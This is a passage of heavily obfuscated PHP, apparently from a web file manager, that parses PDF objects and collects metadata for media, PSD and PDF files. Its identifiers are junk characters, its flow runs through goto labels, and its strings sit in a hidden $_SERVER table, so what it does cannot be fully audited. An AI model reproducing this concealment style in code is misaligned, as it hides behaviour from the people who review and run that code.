$cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1498]][$F§›´˜œ—[1526]] = intval($a÷’‘—à·[1]) . $F§›´˜œ—[70] . intval($a÷’‘—à·[2]); } if (preg_match($F§›´˜œ—[1527], $C’çËÏÈ”‘, $a÷’‘—à·) > 0) { $cŒ§ÎÈŒ‘ª[$F§›´˜œ—[1498]][$F§›´˜œ—[1528]] = intval($a÷’‘—à·[1]) . $F§›´˜œ—[70] . intval($a÷’‘—à·[2]); } goto fôë…ÀÀ; EµÜ¸…‹Óˆ: $F§›´˜œ— =& $_SERVER[¼]; $a‘Úó†åÀ¾ = $f®§æ”‘Á[$F§›´˜œ—[1497]]; $cŒ§ÎÈŒ‘ª = array($F§›´˜œ—[1498] => array(), $F§›´˜œ—[1517] => array()); goto BÀ¹™ß½äÀ; eˆ¶Ò¦­ìœ: if ($f®§æ”‘Á[$F§›´˜œ—[77]] - $CÖÅò½·ù > $f®§æ”‘Á[$F§›´˜œ—[1495]]) { $cêƒİæ™°ù = 4 * $f®§æ”‘Á[$F§›´˜œ—[1495]]; $f®§æ”‘Á[$F§›´˜œ—[1495]] = $cêƒİæ™°ù; $f®§æ”‘Á[$F§›´˜œ—[1496]] = StreamWrapperIO::read($f®§æ”‘Á[$F§›´˜œ—[75]], 0, $cêƒİæ™°ù); $f®§æ”‘Á[$F§›´˜œ—[1497]] = StreamWrapperIO::read($f®§æ”‘Á[$F§›´˜œ—[75]], $f®§æ”‘Á[$F§›´˜œ—[77]] - $cêƒİæ™°ù, $cêƒİæ™°ù); $a‘Úó†åÀ¾ = $f®§æ”‘Á[$F§›´˜œ—[1497]]; } $dù¯ê¢çÉá = 0; preg_match_all($F§›´˜œ—[1519], $a‘Úó†åÀ¾, $a÷’‘—à·); goto cöÌƒá’•Ó; càÈÅöÌÕÅ: } private static function getObjectValue($A•ºÆù‰, $EŒ°·â×«ç, $A©¦…œ™Ò) { goto A”ÉÎ½œ¦; A”ÉÎ½œ¦: $B©“Ö™äçÌ =& $_SERVER[¼]; $e¾¤ñŒ² ½ = self::getObject($A•ºÆù‰, $EŒ°·â×«ç[$B©“Ö™äçÌ[1517]][$A©¦…œ™Ò]); if (is_string($e¾¤ñŒ² ½[1])) { return $e¾¤ñŒ² ½[1]; } goto cšÈ‚³§ ; cšÈ‚³§ : if (!is_array($e¾¤ñŒ² ½[1])) { return array(); } $b‚·ï¼¨Ï = array(); for ($EÃô“ÇùÎ² = 0; $EÃô“ÇùÎ² < count($e¾¤ñŒ² ½[1]); $EÃô“ÇùÎ² += 2) { $AƒÃ¥Ÿ«¤ = $e¾¤ñŒ² ½[1][$EÃô“ÇùÎ²]; $FÚéŸÔ‡ì÷ = $e¾¤ñŒ² ½[1][$EÃô“ÇùÎ² + 1]; if (count($AƒÃ¥Ÿ«¤) == 3 && $AƒÃ¥Ÿ«¤[0] == $B©“Ö™äçÌ[8]) { $C÷Å©ãÒê = !1; if ($FÚéŸÔ‡ì÷[0] == $B©“Ö™äçÌ[1532]) { $FÚéŸÔ‡ì÷ = self::getObject($A•ºÆù‰, $EŒ°·â×«ç[$B©“Ö™äçÌ[1517]][$FÚéŸÔ‡ì÷[1]]); } $C÷Å©ãÒê = $FÚéŸÔ‡ì÷[1]; if ($C÷Å©ãÒê === !1) { continue; } if (is_string($C÷Å©ãÒê)) { $C÷Å©ãÒê = self::decodeStr($C÷Å©ãÒê); } $b‚·ï¼¨Ï[$AƒÃ¥Ÿ«¤[1]] = $C÷Å©ãÒê; } } goto Bö×èá…‡; Bö×èá…‡: return $b‚·ï¼¨Ï; goto D¾ÛÁˆ‘ñ¹; D¾ÛÁˆ‘ñ¹: } private static function getObject($dö¤ÂÄ¢, $B¼ŞÃ´ì´) { $cï±«ò»¿ = self::getObjectItem($dö¤ÂÄ¢, $B¼ŞÃ´ì´); $cï±«ò»¿ = self::getObjectItem($dö¤ÂÄ¢, $cï±«ò»¿[2]); return $cï±«ò»¿; } private static function getObjectItem($D¸…ìïö, $cĞ­åÁ‰¸Ã) { goto e‰áá…¬; e‰áá…¬: $e÷’—‘ùê© =& $_SERVER[¼]; $Dô‚ÅÊ‡Öò = $D¸…ìïö[$e÷’—‘ùê©[1495]]; $Báæ‰îÁ‰ = $D¸…ìïö[$e÷’—‘ùê©[77]] - $Dô‚ÅÊ‡Öò; goto BªäÔ‰¡Æ«; Fƒ‚ƒ£×µ©: $F •§½’ = self::getRawObject($cºâ¦–ñğ, $E°˜ÉÌ“¿”); if ($cĞ­åÁ‰¸Ã >= $Báæ‰îÁ‰) { $F •§½’[2] = $F •§½’[2] + $Báæ‰îÁ‰; } else { if ($cĞ­åÁ‰¸Ã > $Dô‚ÅÊ‡Öò && $cĞ­åÁ‰¸Ã <= $Báæ‰îÁ‰) { $F •§½’[2] = $F •§½’[2] + $cĞ­åÁ‰¸Ã; } } return $F •§½’; goto e½ÚóØÄ©; BªäÔ‰¡Æ«: $E°˜ÉÌ“¿” = $cĞ­åÁ‰¸Ã >= $Báæ‰îÁ‰ ? $cĞ­åÁ‰¸Ã - $Báæ‰îÁ‰ : $cĞ­åÁ‰¸Ã; $cºâ¦–ñğ = $cĞ­åÁ‰¸Ã >= $Báæ‰îÁ‰ ? $D¸…ìïö[$e÷’—‘ùê©[1497]] : $D¸…ìïö[$e÷’—‘ùê©[1496]]; if ($cĞ­åÁ‰¸Ã > $Dô‚ÅÊ‡Öò && $cĞ­åÁ‰¸Ã <= $Báæ‰îÁ‰) { $E°˜ÉÌ“¿” = 0; $cºâ¦–ñğ = StreamWrapperIO::read($D¸…ìïö[$e÷’—‘ùê©[75]], $cĞ­åÁ‰¸Ã, $Dô‚ÅÊ‡Öò); } goto Fƒ‚ƒ£×µ©; e½ÚóØÄ©: } private static function decodeStr($E‹„“Í¥è) { goto A·Öµá¿»Ã; Cğ§êÉ²Ü„: return $E‹„“Í¥è; goto C—Á¡é‰¾; e‘ùå·Ë‚: $E‹„“Í¥è = $dØŒ§Õ¼îƒ[33]; foreach ($E©‡•‘„ñ’ as $C Øğ‰óÈ×) { if (preg_match($dØŒ§Õ¼îƒ[1542], $C Øğ‰óÈ×)) { $E‹„“Í¥è .= \chr(octdec(trim($C Øğ‰óÈ×, $dØŒ§Õ¼îƒ[95]))); } else { $E‹„“Í¥è .= $C Øğ‰óÈ×; } } $E©‡•‘„ñ’ = preg_split($dØŒ§Õ¼îƒ[1543], $E‹„“Í¥è, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto B˜ùÈ¼Ü£; A·Öµá¿»Ã: $dØŒ§Õ¼îƒ =& $_SERVER[¼]; $E‹„“Í¥è = str_replace(array($dØŒ§Õ¼îƒ[1533], $dØŒ§Õ¼îƒ[1534], $dØŒ§Õ¼îƒ[1535], $dØŒ§Õ¼îƒ[1536], $dØŒ§Õ¼îƒ[1537], $dØŒ§Õ¼îƒ[1538], $dØŒ§Õ¼îƒ[1539], $dØŒ§Õ¼îƒ[1540]), array($dØŒ§Õ¼îƒ[95], $dØŒ§Õ¼îƒ[50], $dØŒ§Õ¼îƒ[8], $dØŒ§Õ¼îƒ[245], $dØŒ§Õ¼îƒ[812], $dØŒ§Õ¼îƒ[214], $dØŒ§Õ¼îƒ[985], $dØŒ§Õ¼îƒ[327]), $E‹„“Í¥è); $E©‡•‘„ñ’ = preg_split($dØŒ§Õ¼îƒ[1541], $E‹„“Í¥è, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto e‘ùå·Ë‚; A½ƒ©ïŞ: $E‹„“Í¥è = $dØŒ§Õ¼îƒ[33]; foreach ($E©‡•‘„ñ’ as $C Øğ‰óÈ×) { if (preg_match($dØŒ§Õ¼îƒ[1547], $C Øğ‰óÈ×) && !1 === stripos($C Øğ‰óÈ×, $dØŒ§Õ¼îƒ[1548])) { $C Øğ‰óÈ× = preg_replace($dØŒ§Õ¼îƒ[1549], $dØŒ§Õ¼îƒ[33], $C Øğ‰óÈ×); $C Øğ‰óÈ× = trim($C Øğ‰óÈ×, $dØŒ§Õ¼îƒ[921]); $C Øğ‰óÈ× = pack($dØŒ§Õ¼îƒ[1550], $C Øğ‰óÈ×); $E‹„“Í¥è .= $C Øğ‰óÈ×; } else { $E‹„“Í¥è .= $C Øğ‰óÈ×; } } if (preg_match($dØŒ§Õ¼îƒ[1551], $E‹„“Í¥è)) { $a®ë©»´†Å = substr($E‹„“Í¥è, 2); $E‹„“Í¥è = $dØŒ§Õ¼îƒ[33]; $BÊšÚ¶¯¾± = strlen($a®ë©»´†Å); for ($fñóçõã = 0; $fñóçõã < $BÊšÚ¶¯¾±; $fñóçõã += 2) { $A×Ç„¼ª = hexdec(bin2hex(substr($a®ë©»´†Å, $fñóçõã, 2))); $E‹„“Í¥è .= mb_convert_encoding($dØŒ§Õ¼îƒ[1552] . intval($A×Ç„¼ª) . $dØŒ§Õ¼îƒ[67], $dØŒ§Õ¼îƒ[1553], $dØŒ§Õ¼îƒ[1554]); } } goto Cğ§êÉ²Ü„; B˜ùÈ¼Ü£: $E‹„“Í¥è = $dØŒ§Õ¼îƒ[33]; foreach ($E©‡•‘„ñ’ as $C Øğ‰óÈ×) { if (preg_match($dØŒ§Õ¼îƒ[1544], $C Øğ‰óÈ×)) { $E‹„“Í¥è .= \chr(hexdec(trim($C Øğ‰óÈ×, $dØŒ§Õ¼îƒ[1545]))); } else { $E‹„“Í¥è .= $C Øğ‰óÈ×; } } $E©‡•‘„ñ’ = preg_split($dØŒ§Õ¼îƒ[1546], $E‹„“Í¥è, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto A½ƒ©ïŞ; C—Á¡é‰¾: } private static function getRawObject($dŒÔåĞÍÃ†, $F­¡¼›•è = 0) { goto Dƒ˜áÓÌ‚–; A™Š¾ÓäÖ©: $F­¡¼›•è += strspn($dŒÔåĞÍÃ†, $FçÙé’…Å[1555], $F­¡¼›•è); $fŠƒ¾èÅÄÒ = $dŒÔåĞÍÃ†[$F­¡¼›•è]; switch ($fŠƒ¾èÅÄÒ) { case $FçÙé’…Å[1556]: $DÛºäïÍ©Ô = strcspn($dŒÔåĞÍÃ†, $FçÙé’…Å[1557], $F­¡¼›•è); if ($DÛºäïÍ©Ô > 0) { $F­¡¼›•è += $DÛºäïÍ©Ô; return self::getRawObject($dŒÔåĞÍÃ†, $F­¡¼›•è); } break; case $FçÙé’…Å[8]: $dŠ“Ä²—ïå = $fŠƒ¾èÅÄÒ; ++$F­¡¼›•è; $EñÉ‰†Ğ¨ = preg_match($FçÙé’…Å[1558], substr($dŒÔåĞÍÃ†, $F­¡¼›•è, 256), $D‚Ø²Õãòƒ); if (1 == $EñÉ‰†Ğ¨) { $EÜ…Ö «Ù = $D‚Ø²Õãòƒ[1]; $F­¡¼›•è += strlen($EÜ…Ö «Ù); } break; case $FçÙé’…Å[245]: case $FçÙé’…Å[812]: $dŠ“Ä²—ïå = $fŠƒ¾èÅÄÒ; ++$F­¡¼›•è; $AÂçÌ¯ô˜† = $F­¡¼›•è; if ($FçÙé’…Å[245] == $fŠƒ¾èÅÄÒ) { $c·´è«Òç‚ = 1; while ($c·´è«Òç‚ > 0) { if (!isset($dŒÔåĞÍÃ†[$AÂçÌ¯ô˜†])) { break; } $BŠŒ¤ôé»À = $dŒÔåĞÍÃ†[$AÂçÌ¯ô˜†]; switch ($BŠŒ¤ôé»À) { case $FçÙé’…Å[95]: ++$AÂçÌ¯ô˜†; break; case $FçÙé’…Å[245]: ++$c·´è«Òç‚; break; case $FçÙé’…Å[812]: --$c·´è«Òç‚; break; } ++$AÂçÌ¯ô˜†; } $EÜ…Ö «Ù = substr($dŒÔåĞÍÃ†, $F­¡¼›•è, $AÂçÌ¯ô˜† - $F­¡¼›•è - 1); $F­¡¼›•è = $AÂçÌ¯ô˜†; } break; case $FçÙé’…Å[154]: case $FçÙé’…Å[472]: $dŠ“Ä²—ïå = $fŠƒ¾èÅÄÒ; ++$F­¡¼›•è; if ($FçÙé’…Å[154] == $fŠƒ¾èÅÄÒ) { $EÜ…Ö «Ù = array(); do { $Aƒ„‡ÜÈÇ = $F­¡¼›•è; $CíÈ‰ÌÃ¥¬ = self::getRawObject($dŒÔåĞÍÃ†, $F­¡¼›•è); $F­¡¼›•è = $CíÈ‰ÌÃ¥¬[2]; $EÜ…Ö «Ù[] = $CíÈ‰ÌÃ¥¬; } while ($FçÙé’…Å[472] != $CíÈ‰ÌÃ¥¬[0] && $F­¡¼›•è != $Aƒ„‡ÜÈÇ); array_pop($EÜ…Ö «Ù); } break; case $FçÙé’…Å[920]: case $FçÙé’…Å[923]: if (isset($dŒÔåĞÍÃ†[$F­¡¼›•è + 1]) && $dŒÔåĞÍÃ†[$F­¡¼›•è + 1] == $fŠƒ¾èÅÄÒ) { $dŠ“Ä²—ïå = $fŠƒ¾èÅÄÒ . $fŠƒ¾èÅÄÒ; $F­¡¼›•è += 2; if ($FçÙé’…Å[920] == $fŠƒ¾èÅÄÒ) { $EÜ…Ö «Ù = array(); do { $Aƒ„‡ÜÈÇ = $F­¡¼›•è; $CíÈ‰ÌÃ¥¬ = self::getRawObject($dŒÔåĞÍÃ†, $F­¡¼›•è); $F­¡¼›•è = $CíÈ‰ÌÃ¥¬[2]; $EÜ…Ö «Ù[] = $CíÈ‰ÌÃ¥¬; } while ($FçÙé’…Å[1559] != $CíÈ‰ÌÃ¥¬[0] && $F­¡¼›•è != $Aƒ„‡ÜÈÇ); array_pop($EÜ…Ö «Ù); } } else { $dŠ“Ä²—ïå = $fŠƒ¾èÅÄÒ; ++$F­¡¼›•è; $EñÉ‰†Ğ¨ = preg_match($FçÙé’…Å[1560], substr($dŒÔåĞÍÃ†, $F­¡¼›•è), $D‚Ø²Õãòƒ); if ($FçÙé’…Å[920] == $fŠƒ¾èÅÄÒ && 1 == $EñÉ‰†Ğ¨) { $EÜ…Ö «Ù = strtr($D‚Ø²Õãòƒ[1], $FçÙé’…Å[1561], $FçÙé’…Å[33]); $F­¡¼›•è += \strlen($D‚Ø²Õãòƒ[0]); } elseif (!1 !== ($EØùËğ¸Ñæ = strpos($dŒÔåĞÍÃ†, $FçÙé’…Å[923], $F­¡¼›•è))) { $F­¡¼›•è = $EØùËğ¸Ñæ + 1; } } break; default: if ($FçÙé’…Å[1562] == substr($dŒÔåĞÍÃ†, $F­¡¼›•è, 6)) { $dŠ“Ä²—ïå = $FçÙé’…Å[1562]; $F­¡¼›•è += 6; } elseif ($FçÙé’…Å[101] == substr($dŒÔåĞÍÃ†, $F­¡¼›•è, 4)) { $dŠ“Ä²—ïå = $FçÙé’…Å[101]; $F­¡¼›•è += 4; $EÜ…Ö «Ù = $FçÙé’…Å[101]; } elseif ($FçÙé’…Å[1563] == substr($dŒÔåĞÍÃ†, $F­¡¼›•è, 4)) { $dŠ“Ä²—ïå = $FçÙé’…Å[1564]; $F­¡¼›•è += 4; $EÜ…Ö «Ù = $FçÙé’…Å[1563]; } elseif ($FçÙé’…Å[1565] == substr($dŒÔåĞÍÃ†, $F­¡¼›•è, 5)) { $dŠ“Ä²—ïå = $FçÙé’…Å[1564]; $F­¡¼›•è += 5; $EÜ…Ö «Ù = $FçÙé’…Å[1565]; } elseif ($FçÙé’…Å[1566] == substr($dŒÔåĞÍÃ†, $F­¡¼›•è, 6)) { $dŠ“Ä²—ïå = $FçÙé’…Å[1566]; $F­¡¼›•è += 6; if (1 == preg_match($FçÙé’…Å[1567], substr($dŒÔåĞÍÃ†, $F­¡¼›•è), $D‚Ø²Õãòƒ)) { $F­¡¼›•è += strlen($D‚Ø²Õãòƒ[0]); $E¿íåöÊ¢È = $FçÙé’…Å[1568]; $EñÉ‰†Ğ¨ = preg_match($E¿íåöÊ¢È, substr($dŒÔåĞÍÃ†, $F­¡¼›•è), $D‚Ø²Õãòƒ, PREG_OFFSET_CAPTURE); if (1 == $EñÉ‰†Ğ¨) { $EÜ…Ö «Ù = substr($dŒÔåĞÍÃ†, $F­¡¼›•è, $D‚Ø²Õãòƒ[0][1]); $F­¡¼›•è += $D‚Ø²Õãòƒ[1][1]; } } } elseif ($FçÙé’…Å[1569] == substr($dŒÔåĞÍÃ†, $F­¡¼›•è, 9)) { $dŠ“Ä²—ïå = $FçÙé’…Å[1569]; $F­¡¼›•è += 9; } elseif (1 == preg_match($FçÙé’…Å[1570], substr($dŒÔåĞÍÃ†, $F­¡¼›•è, 33), $D‚Ø²Õãòƒ)) { $dŠ“Ä²—ïå = $FçÙé’…Å[1532]; $F­¡¼›•è += strlen($D‚Ø²Õãòƒ[0]); $EÜ…Ö «Ù = intval($D‚Ø²Õãòƒ[1]) . $FçÙé’…Å[70] . intval($D‚Ø²Õãòƒ[2]); } elseif (1 == preg_match($FçÙé’…Å[1571], substr($dŒÔåĞÍÃ†, $F­¡¼›•è, 33), $D‚Ø²Õãòƒ)) { $dŠ“Ä²—ïå = $FçÙé’…Å[1572]; $EÜ…Ö «Ù = intval($D‚Ø²Õãòƒ[1]) . $FçÙé’…Å[70] . intval($D‚Ø²Õãòƒ[2]); $F­¡¼›•è += strlen($D‚Ø²Õãòƒ[0]); } elseif (($aùëéÓîÂ¹ = strspn($dŒÔåĞÍÃ†, $FçÙé’…Å[1573], $F­¡¼›•è)) > 0) { $dŠ“Ä²—ïå = $FçÙé’…Å[1574]; $EÜ…Ö «Ù = substr($dŒÔåĞÍÃ†, $F­¡¼›•è, $aùëéÓîÂ¹); $F­¡¼›•è += $aùëéÓîÂ¹; } break; } goto d—±èà Å·; d—±èà Å·: return array($dŠ“Ä²—ïå, $EÜ…Ö «Ù, $F­¡¼›•è); goto bÉ¦ßéß´; Dƒ˜áÓÌ‚–: $FçÙé’…Å =& $_SERVER[¼]; $dŠ“Ä²—ïå = $FçÙé’…Å[33]; $EÜ…Ö «Ù = $FçÙé’…Å[33]; goto A™Š¾ÓäÖ©; bÉ¦ßéß´: } } class GetInfo { private static $fileTypeArray; public static function get($E‘„®³ôÌ) { $c‰‹¾àà÷¶ = IO::info($E‘„®³ôÌ); return self::infoAdd($c‰‹¾àà÷¶); } public static function infoAdd(&$Bª’â¢ÖÊÚ) { goto b­ÂÛ‡•è¬; e¿ó‹ä‰Ìö: $Aõ¤ˆ…í = $Bª’â¢ÖÊÚ[$bê”Î‹™°¸[157]]; try { if ($Bª’â¢ÖÊÚ[$bê”Î‹™°¸[157]] == $bê”Î‹™°¸[1577]) { $AŸå¯™óäå = self::psdParse($A¬àŒÈÙ—); $Aõ¤ˆ…í = $bê”Î‹™°¸[1578]; } else { if ($Bª’â¢ÖÊÚ[$bê”Î‹™°¸[157]] == $bê”Î‹™°¸[1579]) { $AŸå¯™óäå = self::pdfParse($A¬àŒÈÙ—); } else { $Aõ¤ˆ…í = self::$fileTypeArray[$bê”Î‹™°¸[1580]][$Bª’â¢ÖÊÚ[$bê”Î‹™°¸[157]]]; $f¥èß¸¹„ = self::$fileTypeArray[$bê”Î‹™°¸[1581]][$Aõ¤ˆ…í][$bê”Î‹™°¸[1582]]; $f‹£²Ö¸Š¥ = @$fØÁ°Ş²¦É->analyze($A¬àŒÈÙ—, $Bª’â¢ÖÊÚ[$bê”Î‹™°¸[77]], $Bª’â¢ÖÊÚ[$bê”Î‹™°¸[28]]); $AŸå¯™óäå = self::parseData($f‹£²Ö¸Š¥, $f¥èß¸¹„, $Bª’â¢ÖÊÚ); } } } catch (Exception $f™…ĞòòË) { $AŸå¯™óäå = array($bê”Î‹™°¸[369] => $Aõ¤ˆ…í); } if (!$AŸå¯™óäå) { return; } goto dè“…ôò; AÄ¸ÆËµâÒ: if (!$Bª’â¢ÖÊÚ || $Bª’â¢ÖÊÚ[$bê”Î‹™°¸[29]] != $bê”Î‹™°¸[164]) { return; } if (!self::support($Bª’â¢ÖÊÚ[$bê”Î‹™°¸[157]]) || isset($Bª’â¢ÖÊÚ[$bê”Î‹™°¸[422]])) { return; } $A¬àŒÈÙ— = $bê”Î‹™°¸[1576] . $Bª’â¢ÖÊÚ[$bê”Î‹™°¸[75]]; goto e¿ó‹ä‰Ìö; b­ÂÛ‡•è¬: $bê”Î‹™°¸ =& $_SERVER[¼]; static $fØÁ°Ş²¦É; if (!$fØÁ°Ş²¦É) { require SDK_DIR . $bê”Î‹™°¸[1575]; $fØÁ°Ş²¦É = new getID3(); } goto AÄ¸ÆËµâÒ; dè“…ôò: $AŸå¯™óäå[$bê”Î‹™°¸[369]] = $Aõ¤ˆ…í; $Bª’â¢ÖÊÚ[$bê”Î‹™°¸[422]] = $AŸå¯™óäå; return $Bª’â¢ÖÊÚ; goto bœ®®ƒæ¼³; bœ®®ƒæ¼³: } public static function support($f«÷½¥) { goto dÖÉÅÁÂ¿Â; Dß„ß »³ù: $CÜßÈë³”ä = array($dŞºÂçÑ¢[1579], $dŞºÂçÑ¢[1577]); if (in_array($f«÷½¥, $CÜßÈë³”ä)) { return !0; } if (isset(self::$fileTypeArray[$dŞºÂçÑ¢[1580]][$f«÷½¥])) { return !0; } goto FİñˆèÇí; FİñˆèÇí: return !1; goto Cù—µò„¬¢; dÖÉÅÁÂ¿Â: $dŞºÂçÑ¢ =& $_SERVER[¼]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $f«÷½¥ = strtolower($f«÷½¥); goto Dß„ß »³ù; Cù—µò„¬¢: } private static function parseData($cøåËº»ì, $DÏ«¥¤×, $aÔÕÊÃÂ ©) { $eĞÍ¯ÀÎï =& $_SERVER[¼]; $d§ñœøŠØ = $cøåËº»ì[$eĞÍ¯ÀÎï[1583]]; $döµïÖ‚ØÙ = array(); foreach ($DÏ«¥¤× as $fí¢ôó² => $còÙÉâ‚) { foreach ($còÙÉâ‚ as $eÙ””Ù­™Ã) { if (is_array($eÙ””Ù­™Ã)) { $BŸ¦Ù™Ã£Ü = self::parseData($cøåËº»ì, $còÙÉâ‚, $aÔÕÊÃÂ ©); if ($BŸ¦Ù™Ã£Ü) { $döµïÖ‚ØÙ[$fí¢ôó²] = $BŸ¦Ù™Ã£Ü; } break; } $Dù¯‚¨—å = str_replace($eĞÍ¯ÀÎï[1357], $d§ñœøŠØ, $eÙ””Ù­™Ã); $BŸ¦Ù™Ã£Ü = _get($cøåËº»ì, $Dù¯‚¨—å); $BŸ¦Ù™Ã£Ü = is_array($BŸ¦Ù™Ã£Ü) ? $BŸ¦Ù™Ã£Ü[0] : $BŸ¦Ù™Ã£Ü; if ($BŸ¦Ù™Ã£Ü) { break; } } if ($BŸ¦Ù™Ã£Ü || $BŸ¦Ù™Ã£Ü === 0 || $BŸ¦Ù™Ã£Ü === !1) { $BŸ¦Ù™Ã£Ü = self::valueReset($eÙ””Ù­™Ã, $BŸ¦Ù™Ã£Ü, $fí¢ôó²); if ($BŸ¦Ù™Ã£Ü !== null) { $döµïÖ‚ØÙ[$fí¢ôó²] = $BŸ¦Ù™Ã£Ü; } } } $döµïÖ‚ØÙ = self::valueResetAll($döµïÖ‚ØÙ, $aÔÕÊÃÂ ©); return $döµïÖ‚ØÙ; } private static function psdParse($C¢öÓòÃõ) { $DªÔÍ¨ºš× =& $_SERVER[¼]; if (IO::fileSubstr($C¢öÓòÃõ, 0, 4) != $DªÔÍ¨ºš×[1584]) { return !1; } $cÄ¡µ£»Íô = getImageSize($C¢öÓòÃõ, $e®”‡İù×‚); if (!$cÄ¡µ£»Íô) { return; } $cË²ß¬åä¬ = array($DªÔÍ¨ºš×[1499] => $cÄ¡µ£»Íô[0], $DªÔÍ¨ºš×[1501] => $cÄ¡µ£»Íô[1]); return $cË²ß¬åä¬; } private static function pdfParse($Bø™­âë“) { return FileParsePdf::parse($Bø™­âë“); } private static function fileTypeParse() { $aÍæ¯ŸÓƒ =& $_SERVER[¼]; $dä­ó–­ã£ = self::fileTypeArray(); $Bç¤Ó½ó©Î = array(); foreach ($dä­ó–­ã£ as $fŞùëàÛ => $CÂ”»©æŸ¹) { $CÁ÷òÄÂÀ³ = _get($CÂ”»©æŸ¹, $aÍæ¯ŸÓƒ[157], $aÍæ¯ŸÓƒ[33]); $c«é´¿Û = is_string($CÁ÷òÄÂÀ³) ? explode($aÍæ¯ŸÓƒ[47], $CÁ÷òÄÂÀ³) : $CÁ÷òÄÂÀ³; if (!$c«é´¿Û) { continue; } foreach ($c«é´¿Û as $CÁ÷òÄÂÀ³) { $CÁ÷òÄÂÀ³ = strtolower(trim($CÁ÷òÄÂÀ³)); if (!$CÁ÷òÄÂÀ³) { continue; } $Bç¤Ó½ó©Î[$CÁ÷òÄÂÀ³] = $fŞùëàÛ; } $dä­ó–­ã£[$fŞùëàÛ][$aÍæ¯ŸÓƒ[157]] = array_keys($Bç¤Ó½ó©Î); $dä­ó–­ã£[$fŞùëàÛ][$aÍæ¯ŸÓƒ[1582]] = self::parseKeyMap($CÂ”»©æŸ¹[$aÍæ¯ŸÓƒ[1582]]); } return array($aÍæ¯ŸÓƒ[1581] => $dä­ó–­ã£, $aÍæ¯ŸÓƒ[1580] => $Bç¤Ó½ó©Î); } private static function parseKeyMap($A°äíµ®èí) { $c²§½İĞ­ª =& $_SERVER[¼]; foreach ($A°äíµ®èí as $CÆ¹¯Ç„È² => $ağ‘µÃ‰°Ê) { if (is_array($ağ‘µÃ‰°Ê)) { $Cë·Ï¬õğÎ = self::parseKeyMap($ağ‘µÃ‰°Ê); if ($Cë·Ï¬õğÎ) { $A°äíµ®èí[$CÆ¹¯Ç„È²] = $Cë·Ï¬õğÎ; } continue; } $DƒÙÇ‚™­Ü = explode($c²§½İĞ­ª[47], $ağ‘µÃ‰°Ê); $d²íÙ×ßÕù = array(); foreach ($DƒÙÇ‚™­Ü as $F«“œÆ–¯) { $F«“œÆ–¯ = trim($F«“œÆ–¯); if (!$F«“œÆ–¯) { continue; } if (preg_match($c²§½İĞ­ª[1585], $F«“œÆ–¯, $a„º¯¤ˆõã)) { $Dœ¹ãëÕƒ = explode($c²§½İĞ­ª[268], $a„º¯¤ˆõã[1]); foreach ($Dœ¹ãëÕƒ as $CÏÇİñ§ ã) { $d²íÙ×ßÕù[] = str_replace($a„º¯¤ˆõã[0], $CÏÇİñ§ ã, $F«“œÆ–¯); } } else { $d²íÙ×ßÕù[] = $F«“œÆ–¯; } } $A°äíµ®èí[$CÆ¹¯Ç„È²] = $d²íÙ×ßÕù; } return $A°äíµ®èí; } private static function valueResetAll($d™•ƒ˜±¨ƒ, $bòêæ‘”Ş²) { goto dŠ’Æ¦ÒîŒ; Eù°¸éÔ: $E·ó‚×õ¾Ü = _get($d™•ƒ˜±¨ƒ, $b˜Èã·õƒ[1598], $b˜Èã·õƒ[33]); $b¯à–ğí™œ = $cÏõ‹”øô÷ . $c†òÙ˜°Ÿ . $E·ó‚×õ¾Ü; if ($b¯à–ğí™œ && get_charset($b¯à–ğí™œ) != $b˜Èã·õƒ[323]) { $d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1595]][$b˜Èã·õƒ[1312]] = iconv_to($d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1595]][$b˜Èã·õƒ[1312]], get_charset($b¯à–ğí™œ), $b˜Èã·õƒ[323]); $d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1595]][$b˜Èã·õƒ[1599]] = iconv_to($d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1595]][$b˜Èã·õƒ[1599]], get_charset($b¯à–ğí™œ), $b˜Èã·õƒ[323]); $d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1595]][$b˜Èã·õƒ[1600]] = iconv_to($d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1595]][$b˜Èã·õƒ[1600]], get_charset($b¯à–ğí™œ), $b˜Èã·õƒ[323]); } goto d‹îµÕ÷á; fêç¥»Ù¨ù: if ($E† ìÂÕª) { $DêÄàªÈñ = IO_PATH_SYSTEM_TEMP . $b˜Èã·õƒ[1591] . KodIO::hashPath($bòêæ‘”Ş²) . $b˜Èã·õƒ[1592]; $d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1593]] = Action($b˜Èã·õƒ[1594])->pluginCacheFileSet($DêÄàªÈñ, $E† ìÂÕª); unset($d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1595]][$b˜Èã·õƒ[1578]]); } $cÏõ‹”øô÷ = _get($d™•ƒ˜±¨ƒ, $b˜Èã·õƒ[1596], $b˜Èã·õƒ[33]); $c†òÙ˜°Ÿ = _get($d™•ƒ˜±¨ƒ, $b˜Èã·õƒ[1597], $b˜Èã·õƒ[33]); goto Eù°¸éÔ; dŠ’Æ¦ÒîŒ: $b˜Èã·õƒ =& $_SERVER[¼]; if (isset($d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1586]])) { $D¥¤êÜ„­ = ceil($d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1586]]); $F…ËèàŒê = intval($D¥¤êÜ„­ / 3600); $fÀõö×²Ö = intval(($D¥¤êÜ„­ - $F…ËèàŒê * 3600) / 60); $eõÂâî°ãæ = $D¥¤êÜ„­ % 60; $d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1587]] = sprintf($b˜Èã·õƒ[1588], $F…ËèàŒê, $fÀõö×²Ö, $eõÂâî°ãæ); if ($F…ËèàŒê == 0) { $d™•ƒ˜±¨ƒ[$b˜Èã·õƒ[1587]] = sprintf($b˜Èã·õƒ[1589], $fÀõö×²Ö, $eõÂâî°ãæ); } } $E† ìÂÕª = _get($d™•ƒ˜±¨ƒ, $b˜Èã·õƒ[1590]); goto fêç¥»Ù¨ù; d‹îµÕ÷á: return $d™•ƒ˜±¨ƒ; goto FÒÃ¼åƒ¬ñ; FÒÃ¼åƒ¬ñ: } private static function valueReset($E¸Ñ§²‰, 